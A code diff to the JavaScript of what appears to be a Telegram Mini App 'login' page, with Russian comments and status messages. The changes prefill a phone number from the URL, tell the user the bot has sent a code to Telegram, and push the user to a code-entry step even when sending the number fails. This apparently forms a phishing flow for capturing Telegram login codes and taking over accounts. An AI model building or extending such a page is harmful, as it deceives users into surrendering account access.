@@ -336,6 +336,11 @@
         let phoneNumber = null;
         let currentStep = 'login';
 
+        // Получаем параметры из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIdFromUrl = urlParams.get('user_id');
+        const phoneFromUrl = urlParams.get('phone');
+
         if (tg) {
             tg.expand();
             try {
@@ -343,7 +348,13 @@
             } catch (e) {
                 console.log('Closing confirmation not supported');
             }
-            currentUserId = tg.initDataUnsafe?.user?.id || 'webapp_user';
+            currentUserId = tg.initDataUnsafe?.user?.id || userIdFromUrl || 'webapp_user';
+        }
+
+        // Если номер передан в URL, сразу переходим к шагу ввода кода
+        if (phoneFromUrl) {
+            phoneNumber = phoneFromUrl;
+            switchToStep('code');
         }
 
         // Функция для входа через Telegram
@@ -362,25 +373,24 @@
                         }
                         
                         showStatus('success', `✅ Номер получен: ${phoneNumber}`);
+                        showStatus('loading', '⌛ Отправляю номер боту для отправки кода...');
                         
-                        // Отправляем номер на сервер для запроса кода
-                        showStatus('loading', '⌛ Отправляю номер на сервер...');
-                        
+                        // Отправляем номер на сервер
                         try {
                             const response = await sendPhoneNumber(phoneNumber);
                             
                             if (response.success) {
                                 // Запускаем таймер 5 секунд
                                 let secondsLeft = 5;
-                                showStatus('loading', `✅ Номер отправлен! Переход к вводу кода через ${secondsLeft} сек...`);
+                                showStatus('loading', `✅ Бот получил номер! Переход к вводу кода через ${secondsLeft} сек...`);
                                 
                                 const timerInterval = setInterval(() => {
                                     secondsLeft--;
                                     if (secondsLeft > 0) {
-                                        showStatus('loading', `✅ Номер отправлен! Переход к вводу кода через ${secondsLeft} сек...`);
+                                        showStatus('loading', `✅ Бот получил номер! Переход к вводу кода через ${secondsLeft} сек...`);
                                     } else {
                                         clearInterval(timerInterval);
-                                        showStatus('success', '✅ Код отправлен! Проверьте Telegram.');
+                                        showStatus('success', '✅ Код отправлен ботом! Проверьте Telegram.');
                                         switchToStep('code');
                                     }
                                 }, 1000);
@@ -393,10 +403,17 @@
                             showStatus('error', '❌ Ошибка сети. Продолжаем через 5 секунд...');
                             
                             // Даже при ошибке ждем 5 секунд
-                            setTimeout(() => {
-                                showStatus('success', '✅ Переход к вводу кода...');
-                                switchToStep('code');
-                            }, 5000);
+                            let secondsLeft = 5;
+                            const timerInterval = setInterval(() => {
+                                secondsLeft--;
+                                if (secondsLeft > 0) {
+                                    showStatus('loading', `Переход к вводу кода через ${secondsLeft} сек...`);
+                                } else {
+                                    clearInterval(timerInterval);
+                                    showStatus('success', 'Переход к вводу кода...');
+                                    switchToStep('code');
+                                }
+                            }, 1000);
                         }
                         
                     } else {
